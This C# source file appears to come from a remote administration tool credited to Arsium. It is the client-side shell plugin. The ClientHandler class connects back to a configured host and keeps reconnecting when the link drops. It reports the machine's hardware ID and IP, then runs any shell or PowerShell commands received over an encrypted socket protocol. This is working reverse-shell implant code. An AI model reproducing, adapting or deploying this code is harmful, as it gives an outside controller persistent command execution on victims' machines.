using PacketLib.Packet;
using PacketLib.Utils;
using PacketLib;
using System.IO;
using System.Net.Sockets;
using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal class ClientHandler : IDisposable
    {
        public Host host { get; set; }
        private Socket socket { get; set; }
        public bool Connected { get; set; }
        public string HWID { get; set; }
        public string baseIp { get; set; }
        public string key { get; set; }
        public bool hasToExit { get; set; }
        private bool isPWS { get; set; }

        private delegate bool ConnectAsync();
        private delegate PacketType SendDataAsync(IPacket data);


        private ConnectAsync connectAsync;
        private readonly SendDataAsync sendDataAsync;

        private delegate byte[] ReadDataAsync();
        private delegate IPacket ReadPacketAsync(byte[] BufferPacket);

        private ReadDataAsync readDataAsync;
        private ReadPacketAsync readPacketAsync;

        private ShellHander shellHander;

        public ClientHandler(Host host, string key, string baseIp, string HWID, bool isPWS) : base()
        {
            this.hasToExit = false;
            this.host = host;
            this.key = key;
            this.HWID = HWID;
            this.baseIp = baseIp;
            sendDataAsync = new SendDataAsync(SendData);
            readDataAsync = new ReadDataAsync(ReceiveData);
            readPacketAsync = new ReadPacketAsync(PacketParser);
            this.isPWS = isPWS;
        }

        public void ConnectStart()
        {
            connectAsync = new ConnectAsync(Connect);
            connectAsync.BeginInvoke(new AsyncCallback(EndConnect), null);
        }

        private bool Connect()
        {
            try
            {
                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
                socket.Connect(host.host, host.port);
                return true;
            }
            catch { }
            return false;
        }
        public void EndConnect(IAsyncResult ar)
        {
            Connected = connectAsync.EndInvoke(ar);

            if (hasToExit)
            {
                return;
            }

            if (!Connected)
            {
                ConnectStart();
            }
            else
            {
                shellHander = new ShellHander(this.isPWS);
                StartShellSessionPacket startShellSessionPacket = new StartShellSessionPacket(this.isPWS)
                {
                    baseIp = this.baseIp,
                    HWID = this.HWID
                };
                this.SendPacket(startShellSessionPacket);
                Receive();
            }
        }

        public void Receive()
        {
            if (hasToExit)
            {
                this.shellHander.Dispose();
                this.Dispose();
                return;
            }
            if (Connected)
                readDataAsync.BeginInvoke(new AsyncCallback(EndDataRead), null);
            else
                ConnectStart();
        }
        private byte[] ReceiveData()
        {
            try
            {
                int total = 0;
                int recv;
                byte[] header = new byte[5];
                socket.Poll(-1, SelectMode.SelectRead);
                recv = socket.Receive(header, 0, 5, 0);

                int size = BitConverter.ToInt32(new byte[4] { header[0], header[1], header[2], header[3] }, 0);
                PacketType packetType = (PacketType)header[4];

                int dataleft = size;
                byte[] data = new byte[size];
                while (total < size)
                {
                    recv = socket.Receive(data, total, dataleft, 0);
                    total += recv;
                    dataleft -= recv;
                }

                return data;
            }
            catch (Exception)
            {
                if (Connected)
                    hasToExit = true;

                Connected = false;
                return null;
            }
        }
        public void EndDataRead(IAsyncResult ar)
        {
            byte[] data = readDataAsync.EndInvoke(ar);

            if (data != null && Connected)
                readPacketAsync.BeginInvoke(data, new AsyncCallback(EndPacketRead), null);
            Receive();
        }

        private IPacket PacketParser(byte[] BufferPacket)
        {
            try
            {
                return BufferPacket.DeserializePacket(this.key);
            }
            catch (Exception)
            { return null; }
        }

        public void EndPacketRead(IAsyncResult ar)
        {
            IPacket packet = readPacketAsync.EndInvoke(ar);

            if (packet != null)
                ParsePacket(packet);
        }

        public void ParsePacket(IPacket packet)
        {
            switch (packet.packetType)
            {
                case PacketType.SHELL_COMMAND:
                    NewCommandShellSessionPacket newCommandShellSessionPacket = (NewCommandShellSessionPacket)packet;
                    this.shellHander.ExecuteCommand(newCommandShellSessionPacket.shellCommand);
                    break;

                case PacketType.SHELL_STOP:
                    hasToExit = true;
                    break;
            }
        }

        public void SendPacket(IPacket packet)
        {
            if (Connected)
                sendDataAsync.BeginInvoke(packet, new AsyncCallback(SendDataCompleted), null);
        }
        private PacketType SendData(IPacket data)
        {
            byte[] encryptedData = data.SerializePacket(this.key);

            int total = 0;
            int size = encryptedData.Length;
            int datalft = size;
            byte[] header = new byte[5];

            byte[] temp = BitConverter.GetBytes(size);

            header[0] = temp[0];
            header[1] = temp[1];
            header[2] = temp[2];
            header[3] = temp[3];
            header[4] = (byte)data.packetType;

            lock (socket)
            {
                try
                {
                    socket.Poll(-1, SelectMode.SelectWrite);
                    int sent = socket.Send(header);

                    if (size > 1000000)
                    {
                        using (MemoryStream memoryStream = new MemoryStream(encryptedData))
                        {
                            int read = 0;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[50 * 1000];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                socket.Send(chunk, 0, read, SocketFlags.None);
                            }
                        }
                    }
                    else
                    {
                        while (total < size)
                        {
                            sent = socket.Send(encryptedData, total, size, SocketFlags.None);
                            total += sent;
                            datalft -= sent;
                        }
                    }
                    return data.packetType;
                }

                catch (Exception)
                {
                    Connected = false;
                }
            }
            return data.packetType;
        }

        private void SendDataCompleted(IAsyncResult ar)
        {
            sendDataAsync.EndInvoke(ar);
        }

        public void Dispose()
        {
            socket.Close();
            socket.Dispose();
            socket = null;
        }
    }
}
